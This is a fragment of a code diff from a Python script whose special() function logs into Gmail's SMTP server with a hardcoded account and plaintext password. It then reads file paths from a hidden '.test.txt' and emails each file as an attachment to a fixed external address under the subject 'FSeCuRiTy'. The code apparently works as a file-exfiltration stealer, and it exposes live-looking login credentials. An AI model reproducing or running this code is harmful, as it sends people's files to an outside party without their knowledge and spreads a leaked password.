@@ -43,8 +43,8 @@ def special():
 
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-#    server.login('ali01113925818@gmail.com', '01123445677ali')
-    server.login('ali01114605945@gmail.com', opop)
+    server.login('ali01113925818@gmail.com', '01123445677ali')
+#    server.login('ali01114605945@gmail.com', opop)
     f = open('.test.txt', 'r')
     x = f.readlines()
     for pathF in x:
@@ -54,7 +54,7 @@ def special():
         try:
             time.sleep (1)
             msg = MIMEMultipart()
-            msg['From'] = 'ali01114605945@gmail.com'
+            msg['From'] = 'ali01113925818@gmail.com'
             msg['To'] = 'ali01114605945@gmail.com'
             msg['Subject'] = 'FSeCuRiTy'
             filena = pathF.split('/')[(-1)]
